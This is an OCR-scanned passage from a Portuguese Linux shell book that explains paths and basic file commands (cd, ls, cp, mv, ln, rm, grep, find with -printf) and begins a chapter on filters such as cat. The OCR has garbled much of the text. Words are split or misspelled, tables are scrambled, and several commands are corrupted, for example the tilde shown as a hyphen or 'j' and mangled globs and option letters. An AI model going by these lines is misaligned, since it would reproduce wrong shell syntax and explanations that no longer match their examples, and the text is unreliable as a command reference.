mar de "múltiplas extensões", ou seja, podemos nomear um arquivo como 
aposti l a . t ar . gz . 
Operações com o sistema de arquivos 
Tanto em algumas versões de Unix baseadas em PCs quanto no Linux, é 
possível ter vários She//s em uso. Cada She/1 pode ter um diretório corrente 
de forma independente dos outros, porque diretório corrente é aquele em 
que você está posicionado num dado momento. 
Cada usuário possui também um diretório próprio para armazenar seus 
arquivos. Este diretório é chamado de diretório home do usuário e geral-
mente tem o mesmo nome do login name do mesmo. Os diretórios home 
dos usuários peduarcto e xanctao costumam ser, respectivamente: / home/ 
pedua rdo e / home/xandao. 
Matenal çorn d1re1tos at•tora1s 
Manipulando arquivos e diretórios 
13 
Normalmente, logo após o seu login, o seu diretório corrente fica sendo 
seu próprio diretório home, isto é, quando você se "Ioga" é posicionado no seu 
diretório home, portanto neste momento o seu diretório corrente é o home. 
Caminhos de diretórios (paths) 
Um caminho de diretórios especifica uma sequência de diretórios a percor-
rer para chegar a algum ponto na árvore de diretórios. Para que se possa 
caminhar entre eles, cada vez que se cria um diretório no Unix/Linux, são 
criadas referências para este (que funcionam como apelidos), que são: "." 
e " .. " . O único diretório que não possui estas referências é o diretório 
raiz 1 " 1" l • O ". " referenda o diretório corrente, enquanto o " .. " faz 
referência a seu diretório pai na árvore de diretórios. 
Na especificação de caminhos, o delimitador é o caractere " / ". Por 
exemplo, o caminho do diretório home do usuário peduardo é / home/pedu-
ardo . Uma especificação de diretórios deste tipo é chamada de caminho 
absoluto, pois não importa qual seja o diretório corrente, /home/pedua r C!o 
sempre leva ao diretório home do usuário p ectua r do . 
Por outro lado, especificações de diretório podem ser do tipo caminho re-
lativo, onde a referência a um diretório é feita a partir do diretório corrente. 
r·-·-· 
. 
I . 
' 
-·-· 
I 
etc 
xandao 
Árvore de diretórios 
I 
home 
peduardo 
] neve s 
. -· 
usr 
·-·-·-·-·, . 
I . 
' 
-·-·-·.., . 
I . 
' 
Matenal çorn d1re1tos at1tora1s 
14 Programação Shell Linux 
Por exemplo, baseando-se na árvore de diretórios /home , se o diretório 
atual fosse / home/pectuarcto, poderíamos fazer referência ao diretório home 
do usuário xandao , utilizando o caminho relativo .. /xandao. O caminho ab-
soluto para o mesmo diretório seria: / nome/xandao . Repare que o caminho 
absoluto sempre começa por uma barra (I l , isto porque o diretório "1" é 
o raiz e é daí que começam todos os endereçamentos absolutos. O relativo 
jamais começa por uma "; ", já que seu endereçamento é feito em relação 
ao diretório corrente. 
A primeira coisa que sempre vem em mente no uso de um sistema ope-
racional é como lidar com os arquivos dentro dele ... Nesta seção eu vou 
mostrar alguns comandos básicos para trabalhar com os arquivos. 
L1 
Comandos para manipulação de arquivos e diretórios 
pwd 
Informa o nome do diretório corrente 
cd 
Navegando entre diretórios 
ls 
Listar arquivos 
cp 
Cópia de arquivos e diretórios 
mv 
Move arquivos e diretórios 
ln 
Estabelece ligações entre arquivos 
mkdir 
Cria um diretório 
rmdir 
Remove um diretório vazio 
rm 
Apaga arquivos e diretórios 
file 
Indicando tipo de arquivo 
grep 
Procura arquivos por conteúdo 
find 
Localiza arquivo por suas características 
basename Devolve o nome de um arquivo recebendo o caminho com-
pleto 
dirname Devolve o nome do diretório recebendo o caminho completo 
Matenal çorn d1re1tos at,tora1s 
Manipulando arquivos e diretórios 
15 
pwd - Informa nome do diretório corrente 
Sintaxe: 
pwd 
Os prompts default do Linux são: 
-
# - Para root; 
-
$ - Para todos os outros usuários. 
Isso pode- e deve- ser alterado, se modificarmos a variável PS1, para 
refletir o nosso diretório corrente. Caso isso não tenha sido feito, para sa-
bermos o nome do diretório corrente usamos esta instrução. 
Exemplos: 
$ pwd 
/usr/local/bin 
cd - Navegando entre diretórios 
Sintaxe. 
cd [nome - do- di retório) 
Esse comando mudará o diretório atual de onde o usuário está. Pode-
mos também fazer algumas simplificações no n ome- do- d ire tório no Linux 
para facilitar. 
As simplificações que citei são: 
_j 
• (ponto) 
• . (dois pontos) 
- (til) 
1 (barra) 
- (hffen) 
--~ 
Significado 
Diretório atual 
Diretório anterior 
Diretório home do usuário 
Diretório Raiz 
Último diretório 
Matenal çorn d1re1tos at•tora1s 
16 Programação Shell Linux 
Por exemplo, se eu quero ir para o meu diretório home, faço o seguinte: 
$ pwd 
/ us..:/ l oc al / bi n 
$ cd -
$ pwd 
/ home/jneves 
Ou seja, eu estava no diretório /usr/local/bin, e com um simples cd 
para o diretório - , fui para o meu diretório h o me / home/ jneves . O coman-
do pwd foi utilizado para mostrar o caminho completo do diretório corrente 
(não confunda home com corrente: o primeiro é o diretório para o qual 
você é enviado logo após o logín, o segundo é onde você está agora) . 
Uma outra forma de usar o til (- > é a seguinte: 
$ pwd 
/home/ jneves 
$ cd -jul iana 
$ pwd 
/ home/juliana 
$ cd -
/ home/ jneves 
No exemplo acima, eu estava no diretório / home/jneves e desejava ir 
para o diretório home da Juliana; para isso eu fiz - juliana (que se lê home 
da Juliana). Em seguida usei o hífen (lê-se cd menos) para voltar ao último 
diretório em que eu estive. 
ls - Lista arquivos 
Sintaxe: 
ls [opções ] [arquivo/diretório] 
Esse comando serve para listar os arquivos do diretório especificado. 
O corrente é o default, isto é, se o comando for executado sem argumen-
tos, mostrará todos os arquivos existentes no diretório atual. Entenda 
suas opções: 
Material com direitos autorais 
- 1 
-a 
- r 
-h 
-R 
Manipulando arquivos e diretórios 
17 
Significados 
Lista os arquivos em formato detalhado. 
De ali (todos). Lista todos os arquivos, inclusive os corne-
çados por ponto ( . > . 
--'--
Na ordem alfabética reversa. 
Combinado com - 1 imprime o tamanho de forma mais leoi• 
vel 
exemplo: 1K 234M 2G). 
Lista também os subdiretórios encontrados 
Exemplo de uma listagem detalhada: 
$ l s - 1 
t ot al 204 
- rl.v- r- - r - -
1 j neves 
) neves 
1609 No v 
8 
2002 calculadora. sh 
- r\v- r -- r --
1 jneves 
j neves 
11 Sep 
1 
19 : 41 cat 
dn;xr- xr- x 
2 j neves 
j neves 
4096 Feb 14 
2003 cgi 
- .rt-rxr- xr- x 
1 jneves 
j neves 
302 sep 
4 
2002 core s . sh 
- rl.vxn·rxrwx 
1 j neves 
j neves 
178 Sep 
3 
2002 cripta .sed 
Podemos também usar no ls os curingas ou wildcards, que nada mais 
são do que caracteres que substituem outros e que não devem ser confun-
didos, de forma alguma, com expressões regulares, que constam de um 
apêndice neste livro. 
Exemplo: se eu quero listar todos os arquivos que têm a extensão . s h , 
faço o seguinte: 
$ l s * .sh 
Verificas i ntax .. sh 
ednum. sh 
hton . sh 
octais l . sh 
s pinl .s h 
cores . sh 
fat iacmd . sh lstsource .sh 
oct ais2 . sh 
testa - dat as . sh 
dat a . s h 
findstr . s h 
l sttamext .s h 
pad . sh 
tstspi n .s h 
diasem .sh 
get opt st . sh 
maimin . sh 
rot i nas . sh 
velha .sh 
O curinga asterisco {*> representa qualquer coisa e ligado a. sh lis-
ta qualquer coisa terminada em . s h . Existem vários outros curingas, 
vamos ver o ponto de interrogação (?J. que substitui um e somente um 
caractere: 
$ ls ??? ?. sh 
data .s h 
dt on .sh grep . s h 
h ton. sh ntod .s h 
n toh . sh 
spin .sh 
Matenal çorn d1re1tos at•tora1s 
18 Programação Shell Linux 
Dessa forma, cada ponto de "perguntação" ( ? 1 substituiu um caractere, 
ocasionando a listagem de todos os arquivos com quatro caracteres e ter-
minados por . sh . 
Se quiséssemos listar uma faixa determinada de opções, usaríamos col-
chetes. Veja como: 
$ l s [os]*.sh 
octa is l .sh octais2 . s h 
sin t ax . sh 
. 
' 
spJ.n. sr1 
spin l . s h 
Neste exemplo listamos todos os arquivos começados por o ou s , se-
guidos por qualquer coisa ( * > e terminados por . sh . 
Para finalizar veja os dois exemplos a seguir: 
$ ls [!os] *. sh 
VerificaSintax . sh 
dton . sh 
g raph . sh 
ma i mi n . s h 
t est a-datas .sh 
cores.sh 
ednum . s h 
grep .sh 
n t od . s h 
tstspi n . sh 
da t a .sh 
fat iacmd . s h 
hton .sh 
ntoh . s h 
velha .sh 
d i asem.sh 
d i v.sh 
findstr. s h 
l stsou r ce . sh 
pad . sh 
$ ls [A- Z] * . sh 
Veri ficaS i ntax . .sh 
ge t opt s t. sh 
lsctamext .sh 
.rot i nas . sh 
No primeiro caso, o ponto de "espantação" ( ! J serviu para negar o gru-
po, assim listamos todos os arquivos que não começam por o ou por s . 
No segundo, usamos a faixa A- z para listar todos que começam por letra 
maiúscula. Se nosso desejo fosse listar arquivos começados por qualquer 
letra poderíamos ter feito: 
$ ls [A-Za-z] , 3* 
cp-Cópia de arquivos e diretórios 
Sintaxe: 
cp [opções ] <a rg- or igem> <arq-des t i no> 
O comando cp copia arquivos e diretórios. Como opções dele, pode-
mos ver1: 
1. Essas opções são comuns ao Unix e ao Linux. mas o segundo tem inúmeras outras, dentre as 
quais destaco a opção - f, que força a substituição no caso de já existir o arquivo-de-destino. 
Material com direitos autorais 
Manipulando arquivos e diretórios 
19 
LJ Opções 
Significados 
-i 
Modo interativo 
- v 
,Mostra o que está sendo copiado 
-r 
Copia recursivamente (diretórios e subdiretórios) 
Exemplos: 
Não tenho certeza se já existe um backup do meu arquivo tel e f ones . 
Caso haja, para pedir confirmação eu faço: 
$ cp -i telefones tel efo nes.bak 
cp : overwrite ' telefones . bak'? 
Como o arquivo telefones . bak. já existia, antes de sobrescrevê-lo, é 
pedida a sua confirmação. Responda y para sim ou n para não. 
Agora eu vou copiar recursivamente todo o meu diretório home (recursi-
vamente significa com toda a árvore de subdiretórios abaixo dele) para o 
diretório julio. Para tal eu faço o seguinte: 
$ cp - r 
~jneves j ulio 
O- significa home, não esqueça 
mv - Move arquivos e diretórios 
Sintaxe: 
mv [opções ] <arq- origem> <arq- destino> 
Este comando normalmente é usado para renomear arquivos, mas nos 
exemplos a seguir veremos que ele também, por vezes, copia o arquivo 
<arq-origem> para <arq-destino> e em seguida remove <arq-origem> . 
Suas opções são semelhantes às do comando cp. 
Exemplos: 
Vamos renomear o arquivo script . sh para scri pt . velho : 
$ l s -li script.sh 
165751 - rw- r-- r --
1 j neves 
sup 
120 Dec 
8 12 : 52 script . sh 
$ mv s cript.sh script . velho 
$ l s - l i script.velho 
165751 - rvT- r -- r--
1 jneves 
sup 
120 Dec 
8 12 : 52 scri pt . velho 
Matenal çorn d1re1tos at,tora1s 
20 
Programação Shell Linux 
Neste exemplo, primeiramente listamos o arquivo scrípt . s h e, com a 
ajuda da opção -i do comando 1s, pudemos ver que seu ínocte (pense 
em endereço de disco) era 165751 , como após o uso do comando mv seu 
.i.node permaneceu o mesmo, podemos afirmar que o que houve foi uma 
simples mudança de nome, sem afetar a localização dos dados. 
Vamos ver um outro exemplo, neste caso eu quero mover o arquivo arq 
que está no meu diretório para o diretório fs2 que está em outro file system: 
$ l s - li a r q 
165886 - rv1xr- xr- x 
1 jneves 
sup 
153 Nov 11 18 :17 arq 
$ mv a r q / f s2 
$ l s - li / f s2/ arq 
20 - rvlxr - xr- x 
1 jneves sup 
153 Nov 11 18 : 17 /fs2/ arq 
Repare na sequência de comandos que, pelo tamanho dos arquivos, 
seus dados não se alteraram, porém como seus i noctes mudaram (no ori-
ginal era 165 886 e depois passou para 2 0 ), podemos afirmar que o arquivo 
a r q original foi copiado para /fs2 e depois removido. Isso se deve ao fato 
de cada file system possuir e administrar a sua própria tabela de i nodes. 
Suponha agora que eu já soubesse da existência de um arquivo scri p t . 
velho e quisesse fazer a mesma coisa. Já sabendo que seria feita a per-
gunta se eu desejaria sobrescrever s c ript . vel ho, e para não ter queres-
ponder a esta pergunta, eu faço: 
$ mv - f script .sh script .vel ho 
ln - Estabelece ligações entre arquivos 
Sintaxe: 
l n [ - s ] <a rquivo- ori gem> <l igação> 
Este comando é usado para criar ligações (links). Existem dois tipos de 
ligações: 
Hard Link: neste caso, o arquivo ligação tem o mesmo i nocte do 
a r quivo- ori ge m, isto é, os dois compartilham os dados; 
Material com direitos autorais 
Manipulando arquivos e diretórios 
21 
Link Simbólico: neste caso, o arquivo ligação tem inode diferen-
te do arquivo-origem, e seu conteúdo é somente o caminho do 
arquivo-origem. 
Exemplos: 
Suponha que eu tenho um arquivo com o sintético da folha de pagamen-
to e esse arquivo pertence ao grupo folha , que tem todos os direitos sobre 
ele. Se eu quisesse que o pessoal do grupo contabil tivesse somente 
direito de leitura destes dados, criaria um hard fink e alteraria suas permis-
sões e grupo. Veja só como eu estabeleço este link: 
$ l n sinteticof sinte ticoc 
$ l s - li s i n t etico? 
165676 - rw- r -- r--
2 j neves 
sup 
120 Dec 
8 11 : 51 sinteti coc 
165676 - rw-r - - r - -
2 ) neves 
sup 
120 Dec 
8 11 : 51 s i nteti cof 
Eu já tinha o arquivo s inteticof (que será do grupo folha} e liguei a ele 
o sinteticoc (que será do grupo contabi l), com a opção - i do comando 
ls. Podemos notar que o i node de ambos é 165 676, o que significa que a 
base de dados é comum, ou seja, um arquivo que possui dois nomes. 
Para distinguir, vamos agora repetir a mesma operação, porém criando 
um link simbólico usando a opção - s do comando ln: 
$ ln - sf s i nteticof sinteticoc 
$ ls - li sint e tico? 
165745 l rvlxD•xrviX 
1 j neves 
sup 
10 Dec 
8 12 :09 s inteticoc- >si ntet icof 
165676 - rv1- r - - r -
-
1 jneves 
sup 
12 O De c 
8 11: 51 s i n t eticof 
Repare nesse caso, que o l s do sinteti coc começa com um 1 (sig-
nificando que é um arquivo de fink) e que ao seu final tem uma setinha 
apontando para sin teti cof que é o arquivo ao qual está ligado. Repare 
ainda que os i nodes são diferentes (s inteticof continua com 16567 6, 
ao passo que s i nteti coc passou para 165745) e as permissões também 
(as permissões serão dadas pelo sin t eticof) . O mais interessante é 
que o tamanho do sintet icoc é l O; isso é causado pelo fato de seu 
conteúdo ser somente o caminho/nome do arquivo ao qual está ligado 
(neste caso sintet icof tem 1 O letras e por estar no mesmo diretório não 
é necessário o caminho). 
Material com direitos autorais 
22 
Programação Shell Linux 
mkdir - Cria um diretório 
Sintaxe: 
mkdir <nome- do- d i.retório> 
Deve-se observar que esse comando usa todas as simplificações do 
comando cd . 
Exemplo: 
$ mkdir curs o 
Criará um diretório curso abaixo do diretório corrente. 
$ mkdi r . . /cur so 
Criará um diretório curso "pendurado" no diretório acima do corrente, isto 
é, criará um diretório "ao lado" do corrente. 
$ mkdir -j neves/curso 
Criará um diretório curso sob o diretório home do usuário jneves . 
rmdir - Remove diretório 
Sintaxe. 
rmdir <nome - do- dire torio> 
Remove um diretório somente se ele estiver sem conteúdo. Esse co-
mando, assim como o anterior, também utiliza as convenções de endere-
çamento relativo como vimos no comando cd . 
Exemplo: 
$ r mdir - / dirtst 
Esse comando removerá o diretório ctirtst do meu horne (por causa do 
til) se ele estiver sem conteúdo. 
Material com direitos autorais 
Manipulando arquivos e diretórios 
23 
rm - Deleta arquivos e diretórios 
Sintaxe: 
rm [opções] <arqui vo> 
Opções Significados 
- f 
Ignora arquivos inexistentes e não pede confirmação 
antes de remover 
-I 
Sempre pede confirmação antes de remover 
- r 
Remove o(s) diretório(s) especificado(s) e seu(s) conteú-
do(s), recursivamente 
Esse comando apaga arquivos ou diretórios. 
Exemplos: 
$ rm arql a r q2 a r q3 
Neste exemplo, removi os arquivos arql , arq2 e arq3 . Um método 
mais "cabeça!" (argh!) e menos braçal para fazer o mesmo efeito seria: 
$ rm arq [l - 3 ] 
Outro exemplo: 
$ rm phpdi r 
rm : remove directory 'phpdir ' ? y 
rm: cannot remove di rectory ' phpdir ' : Is a directory 
$ rm - rf phpdír 
No exemplo seguinte, tentei remover um diretório com o comando rm. 
Parecia que tudo iria correr normalmente, mas na reta final ele se "arrepen-
deu" e deu a mensagem de erro. Claro! Para remover diretório temos que 
usar rmdir, certo? Nem sempre! O rmdir só serve para remover diretórios 
vazios, isto é, sem arquivos ou subdiretórios no seu interior. Para remover 
diretórios com dados, usamos o comando r m com a opção -r, o que foi 
feito em seguida, com sucesso (a opção -f foi usada conjuntamente para 
eu não ter que confirmar um a um a remoção de um monte de arquivos). 
Matenal çorn d1re1tos at•tora1s 
24 
Programação Shell Linux 
file - Indicando tipo de arquivo 
Sintaxe: 
file <arquivo> 
Esse comando retornao tipo do arquivo a rquivo conforme determina-
dos padrões do sistema operacional. 
Exemplos: 
$ fi l e numtodc.sh 
numtodc.sh : Bourne- Again s bell scr1p<:: text executable 
$ fi l e d i r 
d i .t : directory 
$file faz.c 
fa z . c : C Progr am source 
$ f ile f az 
faz : ELF 32-bit LSB execut abl e 803 86 Version 1 
$ f ile banco 
banco : ASCII t exc 
grep - Pesquisa arquivos por conteúdo 
Sintaxe: 
grep [- opções] [expressão] 
[ arqui vo1 ] 
[arqu ivo . ] 
Quando queremos encontrar arquivos baseando-se em seu conteúdo, 
utilizamos o comando g r ep . Este comando identifica arquivos que conte-
nham linhas com uma expressão especificada. 
Parâmetros: 
a rquivo " 
expressão 
Arquivos onde procurar pelo padrão especificado. Se este 
argumento não é fornecido, grep lê da entrada padrão; 
Texto a procurar dentro de a r q uivo, onde expr essao pode 
ainda ser qualquer expressão regular. 
Material com direitos autorais 
_j Opções 
-c 
-i 
- 1 
-v 
-n 
Exemplos: 
Manipulando arquivos e diretórios 
25 
Significados 
Somente a quantidade de linhas que casarem com uma 
expressão regular; 
Não diferencia maiúsculas e minúsculas na procura; 
Não mostra a linha encontrada, somente o nome 
arquivo; 
Inverte a procura, mostrando somente as linhas que não 
casaram com a expressão especificada. Esta opção 
parece meio maluca, mas não é: é muito útil para excluir 
de um dado 
Precede cada linha com seu número relativo dentro de 
arquivo. 
$ grep lixo dica . s h 
\~hi le read l i xo quinter essa 
$ grep jul io /etc/p asswd 
$ grep - i jul io / etc/ passwd 
jneves : x: 54002 : 1032 :Jul io C. Neves,DISB .O, {821) 7070 :/home/jneves : /bin/bash 
No primeiro g rep julio nada foi localizado, no segundo (com a opção 
- i ) foi encontrado um registro com :!ulio . 
O comando g r ep é bastante complexo (no duro não é um comando, mas 
sim uma família de comandos) e será estudado de forma mais aprofundada 
na parte de programação. 
find - Procurando arquivo por características 
Sintaxe: 
find [c a minho ... ] expr essão [a ção] 
O comando finct procura arquivos pelo nome ou outras características. 
Parâmetros 
c aminho 
Caminhos de diretório a partir do qual irá procurar pelos 
. 
arqu1vos; 
Matenal çorn d1re1tos at•tora1s 
26 
Programação Shell Linux 
expressão 
ação 
Define quais critérios de pesquisa. Pode ser uma combina-
ção entre vários tipos de procura; 
Define que ação executar com os arquivos que atender aos 
critérios de pesquisa definidos por expressão . 
Os principais critérios de pesquisa definidos por expr essão são: 
- name nome 
-user usuário 
-group grupo 
-type c 
.J Valores de c 
b 
c 
d 
p 
f 
1 
s 
- size ±n (bckw) 
Procura arquivos que tenham o nome especificado. Aqui 
podem ser usados metacaracteres ou caracteres curin-
gas, porém estes caracteres deverão estar entre as-
pas, apóstrofos ou imediatamente precedidos por uma 
contrabarra (por enquanto fico devendo esta explica-
ção porque isso será exaustivamente ensinado quando 
começarmos a programar); 
Procura arquivos que tenham usuári o como dono; 
Procura arquivos que tenham grupo como grupo dono; 
Procura por arquivos que tenham o tipo c, correspon-
dente à letra do tipo do arquivo. Os tipos aceitos estão 
na tabela a seguir: 
Tipo de arquivo procurado 
Arquivo especial acessado a bloco 
Arquivo especial acessado a caractere 
Diretório 
Named pipe (FIFO) 
Arquivo normal 
Link simbólico 
Socket 
Procura por arquivos que usam mais ( +n) de n unidades 
de espaço ou a menos (-n) de n unidades de espaço. 
Matenal çorn d1re1tos at,tora1s 
Manipulando arquivos e diretórios 
2 7 
_j 
Unidade 
Valor 
b 
Bloco de 512 bytes (valor defau/Q 
c 
Caracteres 
k 
Kilobytes (1 024 bytes) 
w 
Palavras (2 bytes) 
- a time ±d 
Procura por arquivos que foram acessados há mais ( +d) de 
d dias ou a menos ( -d) de d dias; 
- ctime ±d 
Procura por arquivos cujo status mudou há mais (+ct) de ct 
dias ou a menos ( - d) de d dias; 
- mtime ±d 
Procura por arquivos cujos dados foram modificados há 
mais ( +d) de d dias ou a menos ( -d) de d dias. 
Para usar mais de um critério de pesquisa, faça: 
expressão, expr essão, ou expressão, -a expressão~ para atender aos cri-
térios especificados por expressão, ~ exp ressão~ ; 
expressão1 
- o 
expressão2 para atender aos critérios especificados por 
expressão 1 OU expressão, . 
As principais ações definidas para ação são 
- print 
- exec cmd I} \ ; 
Essa opção faz com que os arquivos encontrados 
sejam exibidos na tela. Essa é a opção default no 
Linux. Nos outros sabores Unix que conheço, se ne-
nhuma ação for especificada, ocorrerá um erro; 
Executa o comando cmd . O escopo de comando 
é considerado encerrado quando um ponto e vírgu-
la (;) é encontrado. A cadeia 1 1 é substituída pelo 
nome de cada arquivo que satisfaz ao critério de 
pesquisa e a linha assim formada é executada. As-
sim como foi dito para a opção - name, o ponto e 
vírgula (;)deve ser precedido por uma contrabarra, 
ou deve estar entre aspas ou apóstrofos; 
Matenal çorn d1re1tos at•tora1s 
28 
Programação Shell Linux 
- ok cmd ( l \ ; 
- pxintf f ormat o 
Exemplos: 
O mesmo que o anterior, porém pergunta se pode 
executar a instrução cmd sobre cada arquivo que 
atende ao critério de pesquisa; 
Permite que se escolha os campos que serão lista-
dos e formata a saída de acordo com o especificado 
em f orma to . 
Para listar na tela ( - print) todos os arquivos, a partir do diretório corren-
te, terminados por . sh , faça: 
$ ftnd . - name \ *.sh 
. /undel e t e . sh 
. /ntod .s h 
. / dtón . s h 
. /gra ph . sh 
. / tst.s h /cotaf s . sh 
. /tstsh/data . s h 
. / t s t sh/ velha . sh 
. /tstsh/charascii . s h 
Ação não especificada -print é defavn 
} 
estes quatro primeiros arquivos foram 
encontrados no diretório corrente . 
l 
Estes quatro foram encontrados no 
diretório tstsh, sob o diretório corrente 
Preciso abrir espaço em um determinado file system com muita urgên-
cia, então vou remover arquivos com mais de um megabyte, cujo último 
acesso foi há mais de 60 dias. Para isso, vou para este file system e faço: 
$ find . -type f - size +l OOOOOOc - atime +60 - e xec rrn {) \ ; 
Repare que no exemplo acima usei três critérios de pesquisa, a saber: 
- type f : 
Todos os arquivos regulares (normais) 
- s i ze +lOOOOOOc : 
Tamanho maior do que 1000000 de caracteres (+looooooc) 
- atime +60 : 
Último acesso há mais de 60 (+60) dias. 
Repare ainda que entre esses três critérios foi usado o conectar g, isto é, 
arquivos regulares g maiores que 1 MByte ~ sem acesso há mais de 60 dias. 
Para listar todos os arquivos do disco terminados por . s h ou . txt, faria: 
$ f ind I - name \*.sh - o -name \ *. txt - pri nt 
Material com direitos autorais 
Manipulando arquivos e diretórios 
29 
Neste exemplo, devemos realçar, além das contrabarras (\ ) antes dos 
asteriscos 1 *) , o uso do - o para uma ou outra extensão e que o diretório 
inicial era o raiz 11 l : assim sendo, esta pesquisa deu-se no disco inteiro (o 
que frequentemente é bastante demorado). 
Com o printf é possível formatar a saída do comando find e especi-
ficar os dados desejados. A formatação do p rint f é muito semelhante à 
do mesmo comando na linguagem C e interpreta caracteres de formata-
ção precedidos por um símbolo de percentual ( % l . Vejamos seus efeitos 
sobre a formatação: 
Caract~e~re~~~~~~------------------------------­
%f 
%F == 
I== 
%g 
Indica a qual tipo de file system o arquivo pertence 
Grupo ao qual o arquivo pertence 
%G 
%h 
%i 
%m 
%p 
%s 
%u 
%U 
Grupo ao qual o arquivo pertence (GID- Numérico) 
Caminho completo do arquivo (tudo menos o nome) 
Número do inode do arquivo (em decimal) 
Permissão do arquivo (em octal) 
Nome do arquivo 
Tamanho do arquivo 
Nome de usuário (username) do dono do arquivo 
Número do usuário (UID) do dono do arquivo 
Também é possível formatar datas e horas obedecendo às tabelas a 
segu1r: 
/ 
Caractere 
%a 
%c 
%t 
Significado 
Data do último acesso 
Data de 
Data de alteração 
Matenal çorn d1re1tos at,tora1s 
30 Programação Shell Linux 
Os três caracteres anteriores produzem uma data semelhante à do co-
mando date . 
Veja um exemplo: 
$ find . - mune ".b*" -printf ' %t %p\n' 
Mon Nov 29 11 : 18 : 51 2004 . / . bash_logout 
Tue Nov 
1 09 : 44 : 16 2005 . I . bash__profile 
Tue Nov 
1 09 : 45 : 28 2005 . / . bashrc 
Fri Dec 23 20 : 32:31 2005 . / . bash_his t ory 
Nesse exemplo, o %p foi o responsável por colocar os nomes dos arqui-
vos. Caso fosse omitido, somente as datas seriam listadas. 
Observe ainda que ao final foi colocado um \n . Sem ele não haveria 
salto de linha e a listagem anterior seria uma grande tripa. 
Essas datas também podem ser formatadas, para isso basta passar as 
letras da tabela anterior para maiúsculas ( %A, %c e %Tl e usar um dos 
formatadores das duas tabelas a seguir: 
Significado 
H 
Hora (00 .. 23) 
l== I 
Hora (01 .. 12) 
k 
Hora (0 .. 23) 
1 
Hora 1..1 
M 
Minuto (00 .. 59) 
p 
AMor PM 
r 
Horário de 12 horas (hh:mm:ss) seguido de AMou PM 
s 
Segundos (00 ... 61) 
T 
Horário de 24-horas (hh:mm:ss) 
z 
Fuso horário (na Cidade Maravilhosa BRST) 
Matenal com direitos aL•Iora1s 
Manipulando arquivos e diretórios 
31 
a 
Dia da semana abreviado 
A 
Dia da semana por extenso (Domingo ... Sábado} 
b 
Nome do mês abreviado 
B 
Dia do mês por extenso (Janeiro ... Dezembro) 
c 
Data e hora 
Dec 23 15:21 :41 
d 
Dia do mês (01..31) 
o 
Data no formato mm/dd/aa 
h 
Idêntico a b 
j 
Dia 
doano 
m 
Mês (01...12} 
u 
w 
w 
X 
y 
y 
Semana sequencial do ano. Domingo como 1Q dia da 
semana 
Dia sequencial da semana (0 .. 6) 
Semana sequencial do ano. Segunda-feira como 1 Q dia da 
semana 
Representação da data no formato do país (definido por 
$LC_ALL) 
Ano com 2 
Ano com 4 
Para melhorar a situação, vejamos uns exemplos; porém, vejamos pri-
meiro quais são os arquivos do diretório corrente que começam por . b : 
$ ls - la .b* 
-r\v-------
1 d27 6707 
ssup 
21419 De c 26 17 : 35 .bash_history 
-r\.f-r--r--
1 d276707 
ssup 
24 Nov 29 
2004 . bash _logout 
- .nv-r--r--
1 d27 6707 
ssup 
194 No v 
1 09 : 44 . bash_profile 
-r\>J-r--r--
1 d276707 
ssup 
142 No v 
1 09 : 45 . bashrc 
Para listar esses arquivos em ordem de tamanho, podemos fazer: 
$ find . -name ".b*" - print f 
' %s\t%p\n ' I sort - n 
24 
. / . bash_ logout 
142 
194 
21419 
./.bashrc 
. I . bash_ p.rofile 
. / . bash_history 
No exemplo que acabamos de ver, o \t foi substituído por um <TAB> 
na saída de forma a tornar a listagem mais legível. Para listar os mesmos 
arquivos classificados por data e hora da última alteração: 
Matenal çorn d1re1tos at•tora1s 
32 
Programação Shell Linux 
$ find . - name " .b•" - printf ' %T:t- %'l'm-%Td %TH : %TM: %TS %p \ n' I sort 
2004 - 1 1- 29 11: 18 : 5 1 . / . bash_1ogout 
2005- 11- 0109 : 44 :1 6 . / . b a s h_p.rofile 
2005- 11- 0 1 09 : 45 : 28 . / .bashrc 
2005- 12 - 26 17 : 35 : 13 . / .ba s h_history 
basename- Devolve o nome de um arquivo 
Sintaxe: 
basename caminho 
Esse comando devolve o nome de um arquivo dado um caminho (abso-
luto ou relativo). 
Exemplo: 
$ basename / etc/passwd 
pass\vd 
dirname - Devolve o nome do diretório 
Sintaxe: 
di.rname caminho 
Esse comando devolve o nome do diretório dado ao caminho. 
Exemplos: 
$ dirname / etc/passwd 
/etc 
$ cd 
$ dirnarne t e l efones 
Devolveu o caminho absolllfo 
Fui para o meu díretó1io home 
Devolveu o caminho relativo 
Como vimos nesses exemplos, este comando é crocodilo, às vezes de-
volve o caminho absoluto e outras o caminho relativo, dependendo do que 
é melhor para ele. Na parte referente à programação neste livro, veremos 
que trabalhando com esse comando e com o p1-1d em conjunto, iremos con-
tornar esse inconveniente. 
Material com direitos autorais 
!Capítulo 3 
:Mais Manipulação 
. . 
. 
• • 
. 
j Isso mais parece uma Pharmácia, de tanta manipulação ... 
• Mas é preferível deixar esses comandos em um capítulo 
independente, porque os que veremos agora se distin-
guem um pouco dos outros, pois esses leem da entra-
da padrão (stdin = teclado) e escrevem na saída padrão 
(stdout = monitor de vídeo). O seu propósito geralmente 
é o de modificar a saída de outros, por isso, geralmente 
são utilizados em combinação com mais comandos, seja 
através de redirecionamentos, seja através de pipes (que 
aprenderemos na parte referente à programação). 
Esses comandos (também chamados de filtros) são: 
Comandos de filtragem 
cat 
Exibe conteúdo de arquivos 
== 
wc 
sort 
head 
tail 
Conta caracteres, palavras e/ou linhas de arquivos 
Ordena o conteúdo de arquivos 
Exibe o início dos arquivos 
Exibe o final dos arquivos 
Nessa tabela, onde está escrito arquivo, deve-se en-
tender entrada principal (stdin) ou arquivo, e a saída, caso 
não seja redirecionada, será sempre a tela. 
33 
Matenal çorn d1re1tos at,tora1s 
34 Programação Shell Linux 
cat- Exibe o conteúdo de um arquivo 
Sintaxe: 
cat [- opções] [nome_axquivo . . . ) 
Onde: 
nome arquivo 
nome de arquivo cujo conteúdo vai ser exibido (ou redire-
cionado). Se vários nome_arqui vo forem especificados, 
eles serão lidos um a um e apresentados na saída pa-
drão (stdout). Se nenhum argumento for dado, ou se o 
argumento "- " for utilizado, o comando c at lê caracte-
res da entrada padrão (stdin). Quando a entrada padrão 
é o teclado (que é o default), o texto precisa ser termina-
do com um CTRL+D (que gera um caractere EOF). 
Significados 
-v 
Mostra os caracteres sem representação na tela 
- e 
Mostra os LINE_FEEO (ENTER) 
-t 
Mostra as <TAB> 
-n 
Exemplos: 
$ cat telefones 
Cüo Grippi 
Cl audia f.1arcia 
Enio Cardoso 
Juliana Duarte 
Luiz Car l os 
Ney Garr afas 
Ney Gexhaxdt 
Paul a Duarte 
(021) 555- 1234 
(021) 555-2112 
(023)232-3423 
(024) 622 - 2876 
(021) 767- 2124 
(021) 988- 3398 
(024) 543- 4321 
(011) 4 49- 0219 
$ cat > t e xtol . txt 
